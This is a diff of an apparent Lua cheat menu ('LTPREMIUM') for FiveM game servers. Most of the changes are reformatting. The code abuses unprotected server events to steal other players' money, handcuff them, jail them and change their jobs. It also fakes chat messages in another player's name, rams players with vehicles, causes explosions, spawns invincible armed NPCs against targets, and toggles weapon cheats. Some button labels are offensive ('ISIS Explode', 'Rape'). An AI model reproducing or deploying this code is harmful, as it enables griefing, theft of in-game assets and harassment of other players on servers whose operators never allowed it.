-                    elseif LTPREMIUM.Button("Mechanic") then
-                        TriggerServerEvent("NB:recruterplayer",GetPlayerServerId(selectedPlayer),"mecano",3)
-                    elseif LTPREMIUM.Button("Taxi") then
-                        TriggerServerEvent("NB:recruterplayer",GetPlayerServerId(selectedPlayer),"taxi",3)
-                    elseif LTPREMIUM.Button("Ambulance") then
-                        TriggerServerEvent("NB:recruterplayer",GetPlayerServerId(selectedPlayer),"ambulance",3)
-                    elseif LTPREMIUM.Button("Real Estate Agent") then
-                        TriggerServerEvent("NB:recruterplayer",GetPlayerServerId(selectedPlayer),"realestateagent",3)
-                    elseif LTPREMIUM.Button("Car Dealer") then
-                        TriggerServerEvent("NB:recruterplayer",GetPlayerServerId(selectedPlayer),"cardealer",3)
+                elseif LTPREMIUM.Button("ESX Steal Money From Player") then
+                    local d = KeyboardInput("Enter amount of money to steal", "", 100)
+                    if d ~= "" then
+                        TriggerServerEvent("esx:removeInventoryItem", GetPlayerServerId(selectedPlayer), "item_money",
+                            "money", d)
                     end
+                elseif LTPREMIUM.Button("ESX Handcuff Player") then
+                    TriggerServerEvent("esx_policejob:handcuff", GetPlayerServerId(selectedPlayer))
+                elseif LTPREMIUM.Button("ESX Send To Jail") then
+                    TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(selectedPlayer), 5000, "Jailed")
+                    TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(selectedPlayer), 45 * 60)
+                    TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(selectedPlayer), 45 * 60)
+                    TriggerServerEvent("js:jailuser", GetPlayerServerId(selectedPlayer), 45 * 60, "Jailed")
+                elseif LTPREMIUM.Button("ESX Get Out Of Jail") then
+                    local ped = selectedPlayer
+                    TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(ped), 0, "escaperino")
+                    TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(ped), 0)
+                    TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(ped), 0)
+                    TriggerServerEvent("js:jailuser", GetPlayerServerId(ped), 0, "escaperino")
+                end
+
+                LTPREMIUM.Display()
+            elseif LTPREMIUM.IsMenuOpened("PlayerESXJobMenu") then
+                if LTPREMIUM.Button("Unemployed") then
+                    TriggerServerEvent("NB:destituerplayer", GetPlayerServerId(selectedPlayer))
+                elseif LTPREMIUM.Button("Police") then
+                    TriggerServerEvent("NB:recruterplayer", GetPlayerServerId(selectedPlayer), "police", 3)
+                elseif LTPREMIUM.Button("Mechanic") then
+                    TriggerServerEvent("NB:recruterplayer", GetPlayerServerId(selectedPlayer), "mecano", 3)
+                elseif LTPREMIUM.Button("Taxi") then
+                    TriggerServerEvent("NB:recruterplayer", GetPlayerServerId(selectedPlayer), "taxi", 3)
+                elseif LTPREMIUM.Button("Ambulance") then
+                    TriggerServerEvent("NB:recruterplayer", GetPlayerServerId(selectedPlayer), "ambulance", 3)
+                elseif LTPREMIUM.Button("Real Estate Agent") then
+                    TriggerServerEvent("NB:recruterplayer", GetPlayerServerId(selectedPlayer), "realestateagent", 3)
+                elseif LTPREMIUM.Button("Car Dealer") then
+                    TriggerServerEvent("NB:recruterplayer", GetPlayerServerId(selectedPlayer), "cardealer", 3)
+                end
 
 
-                    LTPREMIUM.Display()
-                elseif LTPREMIUM.IsMenuOpened("PlayerTrollMenu") then
-                    if LTPREMIUM.Button ("Fake Chat Message") then
-                        local cX=KeyboardInput("Enter message to send","",100)
-                        local cY=GetPlayerName(selectedPlayer)
-                        if cX then
-                            TriggerServerEvent("_chat:messageEntered",cY,{0,0x99,255},cX)
+                LTPREMIUM.Display()
+            elseif LTPREMIUM.IsMenuOpened("PlayerTrollMenu") then
+                if LTPREMIUM.Button("Fake Chat Message") then
+                    local cX = KeyboardInput("Enter message to send", "", 100)
+                    local cY = GetPlayerName(selectedPlayer)
+                    if cX then
+                        TriggerServerEvent("_chat:messageEntered", cY, { 0, 0x99, 255 }, cX)
+                    end
+                elseif LTPREMIUM.Button("Ram w/ Custom Vehicle") then
+                    local cPs = KeyboardInput('Are you sure you want to ram the player? y/n', '', 0)
+                    if cPs == 'y' then
+                        local ModelName1 = KeyboardInput("Enter Vehicle Name", "", 100)
+                        if ModelName1 and IsModelValid(ModelName1) and IsModelAVehicle(ModelName1) then
+                            local model = GetHashKey(ModelName1)
+                            RequestModel(model)
+                            while not HasModelLoaded(model) do
+                                Citizen.Wait(-1000)
+                            end
+                            local offset = GetOffsetFromEntityInWorldCoords(GetPlayerPed(selectedPlayer), 0, -10.0, 0)
+                            if HasModelLoaded(model) then
+                                local veh = CreateVehicle(model, offset.x, offset.y, offset.z,
+                                    GetEntityHeading(GetPlayerPed(selectedPlayer)), true, true)
+                                SetVehicleForwardSpeed(veh, 120.0)
+                            end
+                        else
+                            drawNotification("~r~Model Isn't Valid You Tard")
                         end
-				elseif LTPREMIUM.Button("Ram w/ Custom Vehicle") then
-				local cPs = KeyboardInput('Are you sure you want to ram the player? y/n', '', 0)
-				if cPs == 'y' then
-						local ModelName1 = KeyboardInput("Enter Vehicle Name", "", 100)
-				        if ModelName1 and IsModelValid(ModelName1) and IsModelAVehicle(ModelName1) then
-                        local model = GetHashKey(ModelName1)
-                        RequestModel(model)
-                        while not HasModelLoaded(model) do
-                            Citizen.Wait(-1000)
-                        end
-                        local offset = GetOffsetFromEntityInWorldCoords(GetPlayerPed(selectedPlayer), 0, -10.0, 0)
-                        if HasModelLoaded(model) then
-                            local veh = CreateVehicle(model, offset.x, offset.y, offset.z, GetEntityHeading(GetPlayerPed(selectedPlayer)), true, true)	
-                            SetVehicleForwardSpeed(veh, 120.0)		
-                        end		
-											                    else
-                        drawNotification("~r~Model Isn't Valid You Tard")
-						end
-						elseif cPs == 'n' then
+                    elseif cPs == 'n' then
                         drawNotification(
                             '~h~~r~Operation cancelled~s~.'
                         )
-					    else
+                    else
                         drawNotification(
                             '~h~~r~Invalid Confirmation~s~.'
                         )
@@ -7824,7 +8301,7 @@ for i, dA in pairs(bd) do
                             '~h~~r~Operation cancelled~s~.'
                         )
                     end
-				elseif LTPREMIUM.Button('~y~Explode ~s~Vehicle') then
+                elseif LTPREMIUM.Button('~y~Explode ~s~Vehicle') then
                     if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), true) then
                         AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 4, 1337.0, false, true, 0.0)
                     else
@@ -7888,8 +8365,8 @@ for i, dA in pairs(bd) do
                 elseif LTPREMIUM.Button('~r~ISIS Explode') then
                     AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 5, 3000.0, true, false, 100000.0)
                     AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 5, 3000.0, true, false, true)
-				elseif LTPREMIUM.Button("Small invisible Explosion") then
-                        AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 2, 100000.0, false, true, 0)
+                elseif LTPREMIUM.Button("Small invisible Explosion") then
+                    AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 2, 100000.0, false, true, 0)
                 elseif LTPREMIUM.Button('~r~Rape') then
                     RequestModelSync('a_m_o_acult_01')
                     RequestAnimDict('rcmpaparazzo_2')
@@ -8031,15 +8508,15 @@ for i, dA in pairs(bd) do
                         if HasModelLoaded(eh) then
                             local ped =
                                 CreatePed(
-                                21,
-                                eh,
-                                bK.x + math.sin(i * 2.0),
-                                bK.y - math.sin(i * 2.0),
-                                bK.z - 5.0,
-                                0,
-                                true,
-                                true
-                            ) and
+                                    21,
+                                    eh,
+                                    bK.x + math.sin(i * 2.0),
+                                    bK.y - math.sin(i * 2.0),
+                                    bK.z - 5.0,
+                                    0,
+                                    true,
+                                    true
+                                ) and
                                 CreatePed(
                                     21,
                                     eh,
@@ -8070,7 +8547,7 @@ for i, dA in pairs(bd) do
                             end
                         end
                     end
-				elseif LTPREMIUM.Button("Spawn Mountain Lion") then
+                elseif LTPREMIUM.Button("Spawn Mountain Lion") then
                     local mtlion = "A_C_MtLion"
                     for i = 0, 10 do
                         local co = GetEntityCoords(GetPlayerPed(SelectedPlayer))
@@ -8125,7 +8602,7 @@ for i, dA in pairs(bd) do
                             end
                         end
                     end
-					elseif LTPREMIUM.Button("~h~~r~Spawn ~s~Swat army with ~y~RPG") then
+                elseif LTPREMIUM.Button("~h~~r~Spawn ~s~Swat army with ~y~RPG") then
                     local bQ = "s_m_y_swat_01"
                     local bR = "weapon_rpg"
                     for i = 0, 10 do
@@ -8155,7 +8632,6 @@ for i, dA in pairs(bd) do
                             end
                         end
                     end
-					
                 elseif LTPREMIUM.Button("~h~~r~Spawn ~s~Swat army with ~y~Flaregun") then
                     local bQ = "s_m_y_swat_01"
                     local bR = "weapon_flaregun"
@@ -8216,17 +8692,17 @@ for i, dA in pairs(bd) do
                             end
                         end
                     end
-					elseif LTPREMIUM.Button("Rain Agressive NPC") then
+                elseif LTPREMIUM.Button("Rain Agressive NPC") then
                     local bQ = "mp_f_cocaine_01"
-					local bR = "weapon_knife"
-					for i = 0, 10 do
+                    local bR = "weapon_knife"
+                    for i = 0, 10 do
                         local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                         RequestModel(GetHashKey(bQ))
                         Citizen.Wait(50)
                         if HasModelLoaded(GetHashKey(bQ)) then
                             local ped =
                                 CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z + 15, 0, true, true)
-							NetworkRegisterEntityAsNetworked(ped)
+                            NetworkRegisterEntityAsNetworked(ped)
                             if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                 local ei = PedToNet(ped)
                                 NetworkSetNetworkIdDynamic(ei, false)
@@ -8234,89 +8710,108 @@ for i, dA in pairs(bd) do
                                 SetNetworkIdExistsOnAllMachines(ei, true)
                                 Citizen.Wait(50)
                                 NetToPed(ei)
-								GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
+                                GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
                                 SetEntityInvincible(ped, true)
-								SetPedCanSwitchWeapon(ped, true)
+                                SetPedCanSwitchWeapon(ped, true)
                                 TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                             elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                 TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
                             else
                                 Citizen.Wait(-1000)
                             end
-						end
+                        end
                     end
-                    elseif LTPREMIUM.MenuButton("~r~→  ~s~Spawn Props On Player", "SpawnPropsMenu") then
-                    elseif LTPREMIUM.CheckBox(
+                elseif LTPREMIUM.MenuButton("~r~→  ~s~Spawn Props On Player", "SpawnPropsMenu") then
+                elseif LTPREMIUM.CheckBox(
                         "Freeze Player",
                         freezePlayer,
                         function(enabled)
                             freezePlayer = enabled
                         end)
-                    then
-                    end
+                then
+                end
 
-                    LTPREMIUM.Display()
-                elseif LTPREMIUM.IsMenuOpened("SpawnPropsMenu") then
-                    if LTPREMIUM.CheckBox(
+                LTPREMIUM.Display()
+            elseif LTPREMIUM.IsMenuOpened("SpawnPropsMenu") then
+                if LTPREMIUM.CheckBox(
                         "Attach Prop To Player",
                         attachProp,
                         function(enabled)
                             attachProp = enabled
                         end)
-                    then
-                    elseif LTPREMIUM.ComboBox("Bone", { "Head", "Right Hand" }, currentBone, selectedBone, function(currentIndex, selectedIndex)
+                then
+                elseif LTPREMIUM.ComboBox("Bone", { "Head", "Right Hand" }, currentBone, selectedBone, function(
+                        currentIndex, selectedIndex)
                         currentBone = currentIndex
                         selectedBone = selectedIndex
                     end)
-                    then
-                    elseif LTPREMIUM.Button("Weed") then
-                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
-                        local obj = CreateObject(GetHashKey("prop_weed_01"),coords.x,coords.y,coords.z,true,true,true)
-                        if attachProp then
-                            if selectedBone == 1 then
-                                AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),31086),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
-                            elseif selectedBone == 2 then
-                                AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),28422),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
-                            end
-                        end
-                    elseif LTPREMIUM.Button("UFO") then
-                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
-                        local obj = CreateObject(GetHashKey("p_spinning_anus_s"),coords.x,coords.y,coords.z,true,true,true)
-                        if attachProp then
-                            if selectedBone == 1 then
-                                AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),31086),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
-                            elseif selectedBone == 2 then
-                                AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),28422),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
-                            end
-                        end
-                    elseif LTPREMIUM.Button("Windmill") then
-                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
-                        local obj = CreateObject(GetHashKey("prop_windmill_01"),coords.x,coords.y,coords.z,true,true,true)
-                        if attachProp then
-                            if selectedBone == 1 then
-                                AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),39317),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
-                            elseif selectedBone == 2 then
-                                AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),28422),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
-                            end
-                        end
-                    elseif LTPREMIUM.Button("Custom Prop") then
-                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
-                        local input = KeyboardInput("Enter Prop Name", "", 100)
-                        if IsModelValid(input) then
-                            local obj = CreateObject(GetHashKey(input),coords.x,coords.y,coords.z,true,true,true)
-                            if attachProp then
-                                if selectedBone == 1 then
-                                    AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),31086),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
-                                elseif selectedBone == 2 then
-                                    AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),28422),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
-                                end
-                            end
-                        else
-                            drawNotification("Invalid Model!")
+                then
+                elseif LTPREMIUM.Button("Weed") then
+                    local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
+                    local obj = CreateObject(GetHashKey("prop_weed_01"), coords.x, coords.y, coords.z, true, true, true)
+                    if attachProp then
+                        if selectedBone == 1 then
+                            AttachEntityToEntity(obj, GetPlayerPed(selectedPlayer),
+                                GetPedBoneIndex(GetPlayerPed(selectedPlayer), 31086), 0.4, 0, 0, 0, 270.0, 60.0, true,
+                                true, false, true, 1, true)
+                        elseif selectedBone == 2 then
+                            AttachEntityToEntity(obj, GetPlayerPed(selectedPlayer),
+                                GetPedBoneIndex(GetPlayerPed(selectedPlayer), 28422), 0.4, 0, 0, 0, 270.0, 60.0, true,
+                                true, false, true, 1, true)
                         end
                     end
+                elseif LTPREMIUM.Button("UFO") then
+                    local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
+                    local obj = CreateObject(GetHashKey("p_spinning_anus_s"), coords.x, coords.y, coords.z, true, true,
+                        true)
+                    if attachProp then
+                        if selectedBone == 1 then
+                            AttachEntityToEntity(obj, GetPlayerPed(selectedPlayer),
+                                GetPedBoneIndex(GetPlayerPed(selectedPlayer), 31086), 0.4, 0, 0, 0, 270.0, 60.0, true,
+                                true, false, true, 1, true)
+                        elseif selectedBone == 2 then
+                            AttachEntityToEntity(obj, GetPlayerPed(selectedPlayer),
+                                GetPedBoneIndex(GetPlayerPed(selectedPlayer), 28422), 0.4, 0, 0, 0, 270.0, 60.0, true,
+                                true, false, true, 1, true)
+                        end
+                    end
+                elseif LTPREMIUM.Button("Windmill") then
+                    local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
+                    local obj = CreateObject(GetHashKey("prop_windmill_01"), coords.x, coords.y, coords.z, true, true,
+                        true)
+                    if attachProp then
+                        if selectedBone == 1 then
+                            AttachEntityToEntity(obj, GetPlayerPed(selectedPlayer),
+                                GetPedBoneIndex(GetPlayerPed(selectedPlayer), 39317), 0.4, 0, 0, 0, 270.0, 60.0, true,
+                                true, false, true, 1, true)
+                        elseif selectedBone == 2 then
+                            AttachEntityToEntity(obj, GetPlayerPed(selectedPlayer),
+                                GetPedBoneIndex(GetPlayerPed(selectedPlayer), 28422), 0.4, 0, 0, 0, 270.0, 60.0, true,
+                                true, false, true, 1, true)
+                        end
+                    end
+                elseif LTPREMIUM.Button("Custom Prop") then
+                    local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
+                    local input = KeyboardInput("Enter Prop Name", "", 100)
+                    if IsModelValid(input) then
+                        local obj = CreateObject(GetHashKey(input), coords.x, coords.y, coords.z, true, true, true)
+                        if attachProp then
+                            if selectedBone == 1 then
+                                AttachEntityToEntity(obj, GetPlayerPed(selectedPlayer),
+                                    GetPedBoneIndex(GetPlayerPed(selectedPlayer), 31086), 0.4, 0, 0, 0, 270.0, 60.0, true,
+                                    true, false, true, 1, true)
+                            elseif selectedBone == 2 then
+                                AttachEntityToEntity(obj, GetPlayerPed(selectedPlayer),
+                                    GetPedBoneIndex(GetPlayerPed(selectedPlayer), 28422), 0.4, 0, 0, 0, 270.0, 60.0, true,
+                                    true, false, true, 1, true)
+                            end
+                        end
+                    else
+                        drawNotification("Invalid Model!")
+                    end
+                end
 
-                    LTPREMIUM.Display()
+                LTPREMIUM.Display()
             elseif LTPREMIUM.IsMenuOpened("VehicleRamMenu") then
                 if LTPREMIUM.Button("Futo") then
                     local model = GetHashKey("futo")
@@ -8326,7 +8821,8 @@ for i, dA in pairs(bd) do
                     end
                     local offset = GetOffsetFromEntityInWorldCoords(GetPlayerPed(selectedPlayer), 0, -10.0, 0)
                     if HasModelLoaded(model) then
-                        local veh = CreateVehicle(model, offset.x, offset.y, offset.z, GetEntityHeading(GetPlayerPed(selectedPlayer)), true, true)
+                        local veh = CreateVehicle(model, offset.x, offset.y, offset.z,
+                            GetEntityHeading(GetPlayerPed(selectedPlayer)), true, true)
                         SetVehicleForwardSpeed(veh, 120.0)
                     end
                 elseif LTPREMIUM.Button("Bus") then
@@ -8337,13 +8833,14 @@ for i, dA in pairs(bd) do
                     end
                     local offset = GetOffsetFromEntityInWorldCoords(GetPlayerPed(selectedPlayer), 0, -10.0, 0)
                     if HasModelLoaded(model) then
-                        local veh = CreateVehicle(model, offset.x, offset.y, offset.z, GetEntityHeading(GetPlayerPed(selectedPlayer)), true, true)
+                        local veh = CreateVehicle(model, offset.x, offset.y, offset.z,
+                            GetEntityHeading(GetPlayerPed(selectedPlayer)), true, true)
                         SetVehicleForwardSpeed(veh, 120.0)
                     end
                 end
 
 
-                    LTPREMIUM.Display()
+                LTPREMIUM.Display()
             elseif LTPREMIUM.IsMenuOpened("SingleWepPlayer") then
                 for i = 1, #allWeapons do
                     if LTPREMIUM.Button(allWeapons[i]) then
@@ -8368,48 +8865,48 @@ for i, dA in pairs(bd) do
                         AddAmmoToPed(PlayerPedId(), GetHashKey(allWeapons[i]), 250)
                     end
                 elseif LTPREMIUM.CheckBox(
-                    "No Reload",
-                    dwadawdwd,
-                    function(enabled)
-                        dwadawdwd = enabled
-                        SetPedInfiniteAmmoClip(PlayerPedId(), dwadawdwd)
-                    end)
+                        "No Reload",
+                        dwadawdwd,
+                        function(enabled)
+                            dwadawdwd = enabled
+                            SetPedInfiniteAmmoClip(PlayerPedId(), dwadawdwd)
+                        end)
                 then
                 elseif LTPREMIUM.CheckBox(
-                    "Infinite Ammo",
-                    JYGNDJ,
-                    function(enabled)
-                        JYGNDJ = enabled
-                        SetPedInfiniteAmmo(PlayerPedId(), JYGNDJ)
-                    end)
+                        "Infinite Ammo",
+                        JYGNDJ,
+                        function(enabled)
+                            JYGNDJ = enabled
+                            SetPedInfiniteAmmo(PlayerPedId(), JYGNDJ)
+                        end)
                 then
                 elseif LTPREMIUM.CheckBox(
-                    "Explosive Ammo",
-                    bifegfubffff,
-                    function(enabled)
-                        bifegfubffff = enabled
-                    end)
+                        "Explosive Ammo",
+                        bifegfubffff,
+                        function(enabled)
+                            bifegfubffff = enabled
+                        end)
                 then
                 elseif LTPREMIUM.CheckBox(
-                    "Oneshot",
-                    Oneshot,
-                    function(enabled)
-                        Oneshot = enabled
-                    end)
-                then
-				elseif LTPREMIUM.CheckBox(
-                    "No Recoil",
-                    NOXJDSS,
-                    function(enabled)
-                        NOXJDSS = enabled
-                    end)
+                        "Oneshot",
+                        Oneshot,
+                        function(enabled)
+                            Oneshot = enabled
+                        end)
                 then
                 elseif LTPREMIUM.CheckBox(
-                    "Delete Gun",
-                    WADOHWIB,
-                    function(enabled)
-                        WADOHWIB = enabled
-                    end)
+                        "No Recoil",
+                        NOXJDSS,
+                        function(enabled)
+                            NOXJDSS = enabled
+                        end)
+                then
+                elseif LTPREMIUM.CheckBox(
+                        "Delete Gun",
+                        WADOHWIB,
+                        function(enabled)
+                            WADOHWIB = enabled
+                        end)
                 then
                 elseif LTPREMIUM.MenuButton("~r~→  ~s~Weapon Customization", "WeaponCustomization") then
                 elseif LTPREMIUM.MenuButton("~r~→  ~s~Bullet Gun Options", "BulletGunMenu") then
@@ -8418,41 +8915,42 @@ for i, dA in pairs(bd) do
                 LTPREMIUM.Display()
             elseif LTPREMIUM.IsMenuOpened("WeaponCustomization") then
                 if LTPREMIUM.CheckBox(
-                    "Rainbow Tint",
-                    rainbowTint,
-                    function(enabled)
-                        rainbowTint = enabled
-                    end)
+                        "Rainbow Tint",
+                        rainbowTint,
+                        function(enabled)
+                            rainbowTint = enabled
+                        end)
                 then
-                elseif LTPREMIUM.ComboBox("Weapon Tints", { "Normal", "Green", "Gold", "Pink", "Army", "LSPD", "Orange", "Platinum" }, currentTint, selectedTint, function(currentIndex, selectedIndex)
-                    currentTint = currentIndex
-                    selectedTint = selectedIndex
+                elseif LTPREMIUM.ComboBox("Weapon Tints", { "Normal", "Green", "Gold", "Pink", "Army", "LSPD", "Orange", "Platinum" }, currentTint, selectedTint, function(
+                        currentIndex, selectedIndex)
+                        currentTint = currentIndex
+                        selectedTint = selectedIndex
 
-                    if selectedTint == 1 then
-                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0)
-                    end
-                    if selectedTint == 2 then
-                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 1)
-                    end
-                    if selectedTint == 3 then
-                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 2)
-                    end
-                    if selectedTint == 4 then
-                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 3)
-                    end
-                    if selectedTint == 5 then
-                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 4)
-                    end
-                    if selectedTint == 6 then
-                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 5)
-                    end
-                    if selectedTint == 7 then
-                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 6)
-                    end
-                    if selectedTint == 8 then
-                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 7)
-                    end
-                end)
+                        if selectedTint == 1 then
+                            SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0)
+                        end
+                        if selectedTint == 2 then
+                            SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 1)
+                        end
+                        if selectedTint == 3 then
+                            SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 2)
+                        end
+                        if selectedTint == 4 then
+                            SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 3)
+                        end
+                        if selectedTint == 5 then
+                            SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 4)
+                        end
+                        if selectedTint == 6 then
+                            SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 5)
+                        end
+                        if selectedTint == 7 then
+                            SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 6)
+                        end
+                        if selectedTint == 8 then
+                            SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 7)
+                        end
+                    end)
                 then
                 elseif LTPREMIUM.Button("~g~Add Special Finish") then
                     GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x27872C90)
@@ -8511,45 +9009,48 @@ for i, dA in pairs(bd) do
                 LTPREMIUM.Display()
             elseif LTPREMIUM.IsMenuOpened("BulletGunMenu") then
                 if LTPREMIUM.CheckBox(
-                    "Vehicle Gun",
-                    vehicleGun,
-                    function(enabled)
-                        vehicleGun = enabled
+                        "Vehicle Gun",
+                        vehicleGun,
+                        function(enabled)
+                            vehicleGun = enabled
+                        end)
+                then
+                elseif LTPREMIUM.ComboBox("Vehicle To Shoot", vehicles, currentVehicle, selectedVehicle, function(
+                        currentIndex, selectedIndex)
+                        currentVehicle = currentIndex
+                        selectedVehicle = selectedIndex
                     end)
                 then
-                elseif LTPREMIUM.ComboBox("Vehicle To Shoot", vehicles, currentVehicle, selectedVehicle, function(currentIndex, selectedIndex)
-                    currentVehicle = currentIndex
-                    selectedVehicle = selectedIndex
-
-                end)
-                then
-                elseif LTPREMIUM.ComboBox("Vehicle Speed", vehicleSpeed, currentVehicleSpeed, selectedVehicleSpeed, function(currentIndex, selectedIndex)
-                    currentVehicleSpeed = currentIndex
-                    selectedVehicleSpeed = selectedIndex
-                end)
-                then
-                elseif LTPREMIUM.CheckBox(
-                    "Ped Gun",
-                    pedGun,
-                    function(enabled)
-                        pedGun = enabled
-                end)
-                then
-                elseif LTPREMIUM.ComboBox("Ped To Shoot", peds, currentPed, selectedPed, function(currentIndex, selectedIndex)
-                    currentPed = currentIndex
-                    selectedPed = selectedIndex
-                end)
-                then
-                elseif LTPREMIUM.CheckBox(
-                    "Bullet Gun",
-                    bulletGun,
-                    function(enabled)
-                        bulletGun = enabled
+                elseif LTPREMIUM.ComboBox("Vehicle Speed", vehicleSpeed, currentVehicleSpeed, selectedVehicleSpeed, function(
+                        currentIndex, selectedIndex)
+                        currentVehicleSpeed = currentIndex
+                        selectedVehicleSpeed = selectedIndex
                     end)
                 then
-                elseif LTPREMIUM.ComboBox("Bullet", bullets, currentBullet, selectedBullet, function(currentIndex, selectedIndex)
-                    currentBullet = currentIndex
-                    selectedBullet = selectedIndex
+                elseif LTPREMIUM.CheckBox(
+                        "Ped Gun",
+                        pedGun,
+                        function(enabled)
+                            pedGun = enabled
+                        end)
+                then
+                elseif LTPREMIUM.ComboBox("Ped To Shoot", peds, currentPed, selectedPed, function(currentIndex,
+                                                                                                  selectedIndex)
+                        currentPed = currentIndex
+                        selectedPed = selectedIndex
+                    end)
+                then
+                elseif LTPREMIUM.CheckBox(
+                        "Bullet Gun",
+                        bulletGun,
+                        function(enabled)
+                            bulletGun = enabled
+                        end)
+                then
+                elseif LTPREMIUM.ComboBox("Bullet", bullets, currentBullet, selectedBullet, function(currentIndex,
+                                                                                                     selectedIndex)
+                        currentBullet = currentIndex
+                        selectedBullet = selectedIndex
                     end)
                 then
                 end
